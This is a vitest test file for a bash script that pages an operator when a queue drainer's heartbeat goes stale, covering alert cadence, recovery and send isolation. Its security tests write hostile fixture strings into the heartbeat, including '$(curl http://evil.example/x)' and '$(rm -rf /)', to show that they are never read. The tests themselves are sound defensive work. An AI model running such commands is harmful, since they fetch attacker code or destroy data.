import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { execFileSync } from 'child_process';
import { mkdtempSync, writeFileSync, rmSync, readFileSync, existsSync, utimesSync, mkdirSync, chmodSync } from 'fs';
import { join } from 'path';
import { tmpdir } from 'os';

// ops-drain-staleness.sh — "watch the watcher" for bin/ops-triage-drain.sh. The drainer
// touches $STATE/heartbeat on every healthy tick and DELIBERATELY does NOT touch it when it
// is fully bricked (all outbox items faulted) or dead. This watcher pages Bones when that
// heartbeat goes stale, so a silently-dead or bricked drainer is caught.
//
// SEND ISOLATION (mirrors trigger-watchdog-impact.test.ts + disk-watchdog.test.ts): a real
// Telegram send is STRUCTURALLY impossible — empty framework root (no agent .env → no
// BOT_TOKEN resolvable), CORTEXTOS_BIN=/nonexistent, dead TELEGRAM_API_BASE, no 1Password
// token, dummy chat id, and a temp $STATE. The two state-machine tests that must observe a
// POST-successful-send transition (cadence suppression, once-only recovery) route the send
// through a local NO-OP stub that ignores its args and exits 0 — it sends nothing, touches
// nothing, opens no socket. The dedicated ISOLATION GUARD test keeps CORTEXTOS_BIN=/nonexistent
// and proves a real send is impossible.
//
// SECURITY BOUNDARY: the watcher stats the heartbeat's MTIME ONLY, never its bytes. The
// BOUNDARY test puts hostile content (a fake chat id, a newline, a $(...) ) INSIDE the
// heartbeat and proves it has ZERO effect on the alert text or its target.

const SCRIPT = join(__dirname, '../../../bin/ops-drain-staleness.sh');
let isoFwRoot: string;
let stubBin: string; // no-op local transport (exit 0, sends nothing)

beforeAll(() => {
  isoFwRoot = mkdtempSync(join(tmpdir(), 'ods-fwroot-'));
  stubBin = join(mkdtempSync(join(tmpdir(), 'ods-stub-')), 'cortextos-noop');
  // Ignores every argument, opens no socket, writes nothing — a "send" that provably
  // sends nothing. Lets a test observe the state machine AFTER a successful delivery
  // (marker written / removed) without any real Telegram path.
  writeFileSync(stubBin, '#!/usr/bin/env bash\nexit 0\n');
  chmodSync(stubBin, 0o755);
});
afterAll(() => { rmSync(isoFwRoot, { recursive: true, force: true }); });

const nowSec = () => Math.floor(Date.now() / 1000);

// A fresh temp $STATE per call; the heartbeat (if any) lives at $STATE/heartbeat.
function newState(): string { return mkdtempSync(join(tmpdir(), 'ods-st-')); }

function run(state: string, opts: {
  dry?: string; bin?: string; extra?: Record<string, string>;
} = {}): string {
  return execFileSync('bash', [SCRIPT], {
    env: {
      ...process.env,
      OPS_DRAIN_STATE_DIR: state,
      OPS_DRAIN_DRY_RUN: opts.dry ?? '1',
      // token isolation — a real send is structurally impossible from a test:
      // empty framework root (no agent .env → no BOT_TOKEN), no cortextos bin,
      // no 1Password token, dummy chat, dead raw-curl endpoint.
      CTX_FRAMEWORK_ROOT: isoFwRoot,
      CORTEXTOS_BIN: opts.bin ?? '/nonexistent',
      OPS_DRAIN_CHAT_ID: '000',
      OP_SA_TOKEN_FILE: '/nonexistent',
      TELEGRAM_API_BASE: 'http://127.0.0.1:9',
      ...(opts.extra ?? {}),
    },
    encoding: 'utf-8',
  });
}

const logPath = (st: string) => join(st, 'staleness.log');
const logOf = (st: string) => (existsSync(logPath(st)) ? readFileSync(logPath(st), 'utf-8') : '');
const marker = (st: string) => join(st, 'alert.drainstale.json');
const hb = (st: string) => join(st, 'heartbeat');
const writeHb = (st: string, ageSec: number, content = '') => {
  writeFileSync(hb(st), content);
  const t = nowSec() - ageSec;
  utimesSync(hb(st), t, t);
};
const STALE_MSG = '🔴 ops-triage drainer heartbeat STALE';

describe('ops-drain-staleness classification (mtime-only)', () => {
  it('heartbeat fresh (mtime now) → OK, no alert', () => {
    const st = newState();
    writeHb(st, 0);
    const out = run(st);
    expect(out).toContain('DECISION=OK');
    expect(logOf(st)).not.toContain('DRY_RUN alert');
    expect(logOf(st)).not.toContain('STALE');
  });

  it('heartbeat ABSENT → PAGE, alert text is the stale-drainer page', () => {
    const st = newState(); // no heartbeat file at all
    const out = run(st);
    expect(out).toContain('DECISION=PAGE');
    // the exact alert text that WOULD be delivered (dry-run logs it, sends nothing)
    expect(logOf(st)).toContain(`DRY_RUN alert: ${STALE_MSG}`);
  });

  it('heartbeat stale (mtime older than STALE_SEC) → PAGE', () => {
    const st = newState();
    writeHb(st, 3600); // 1h old > 1800s default threshold
    const out = run(st);
    expect(out).toContain('DECISION=PAGE');
    expect(logOf(st)).toContain(`DRY_RUN alert: ${STALE_MSG}`);
  });

  it('heartbeat within a custom STALE_SEC is fresh; just past it is stale', () => {
    const fresh = newState();
    writeHb(fresh, 100);
    expect(run(fresh, { extra: { OPS_DRAIN_STALE_SEC: '300' } })).toContain('DECISION=OK');
    const stale = newState();
    writeHb(stale, 400);
    expect(run(stale, { extra: { OPS_DRAIN_STALE_SEC: '300' } })).toContain('DECISION=PAGE');
  });
});

describe('ops-drain-staleness state machine', () => {
  it('no-spam: a 2nd stale tick within REALERT_SEC is suppressed', () => {
    const st = newState();
    writeHb(st, 3600);
    // tick 1 — the no-op stub "sends" (nothing) so the marker records a successful alert
    run(st, { dry: '0', bin: stubBin });
    expect(existsSync(marker(st))).toBe(true);
    const firstLog = logOf(st);
    expect(firstLog).toContain('alert sent via bus CLI');
    expect((firstLog.match(/alert sent via bus CLI/g) || []).length).toBe(1);
    // tick 2 — still stale, within REALERT_SEC → suppressed, NO second send
    run(st, { dry: '0', bin: stubBin });
    const secondLog = logOf(st);
    expect(secondLog).toContain('suppressed by cadence');
    expect((secondLog.match(/alert sent via bus CLI/g) || []).length).toBe(1);
  });

  it('recovery fires ONCE: stale+alerted, then fresh → one recovery, marker cleared', () => {
    const st = newState();
    writeHb(st, 3600);
    run(st, { dry: '0', bin: stubBin });          // alert (marker created)
    expect(existsSync(marker(st))).toBe(true);
    writeHb(st, 0);                                // heartbeat beats again
    run(st, { dry: '0', bin: stubBin });          // recovery → marker removed
    expect(existsSync(marker(st))).toBe(false);
    const afterRecovery = logOf(st);
    expect((afterRecovery.match(/recovery sent/g) || []).length).toBe(1);
    // fresh again — no marker, so NO second recovery
    run(st, { dry: '0', bin: stubBin });
    expect((logOf(st).match(/recovery sent/g) || []).length).toBe(1);
  });

  it('ISOLATION GUARD: a non-dry stale tick NEVER makes a real send (delivery-failed, never "alert sent")', () => {
    const st = newState();
    writeHb(st, 3600);
    run(st, { dry: '0' }); // CORTEXTOS_BIN=/nonexistent, dead curl, no token
    const lg = logOf(st);
    expect(lg).toContain('ALERT DELIVERY FAILED'); // it tried…
    expect(lg).not.toContain('alert sent');        // …and provably could NOT reach a live endpoint
  });
});

describe('ops-drain-staleness security boundary (mtime, not bytes)', () => {
  it('BOUNDARY: hostile content inside the heartbeat has ZERO effect on the alert or its target', () => {
    const st = newState();
    // A fresh heartbeat whose CONTENTS try to smuggle a new chat id / a shell sub / a curl
    // directive. If the watcher read the bytes, any of these could steer the alert. It does not.
    const hostile = '000\nchat_id=6660000\ntext=pwned\n$(curl http://evil.example/x)\n"; url = "http://evil.example"\n';
    writeHb(st, 3600, hostile); // stale, so the page fires — worst case for a content leak
    const out = run(st);
    expect(out).toContain('DECISION=PAGE');
    const lg = logOf(st);
    // the alert that WOULD be delivered is the fixed page text; NONE of the hostile bytes appear
    expect(lg).toContain(`DRY_RUN alert: ${STALE_MSG}`);
    expect(lg).not.toContain('6660000');
    expect(lg).not.toContain('evil.example');
    expect(lg).not.toContain('pwned');
    expect(out).not.toContain('6660000');
    expect(out).not.toContain('evil.example');
  });

  it('BOUNDARY: a fresh heartbeat with hostile bytes is still just OK (content never read)', () => {
    const st = newState();
    writeHb(st, 0, 'chat_id=6660000\n$(rm -rf /)\n');
    const out = run(st);
    expect(out).toContain('DECISION=OK');
    expect(out).not.toContain('6660000');
    expect(logOf(st)).not.toContain('6660000');
  });

  it('BOUNDARY (static): the script stats the heartbeat mtime and never cats/reads its bytes', () => {
    const src = readFileSync(SCRIPT, 'utf-8');
    expect(src).toContain('stat -c %Y "$HB"'); // mtime only
    expect(src).not.toMatch(/cat\s+"\$HB"/);   // never reads the content
    expect(src).not.toMatch(/<\s*"\$HB"/);      // never redirects the file in
  });
});
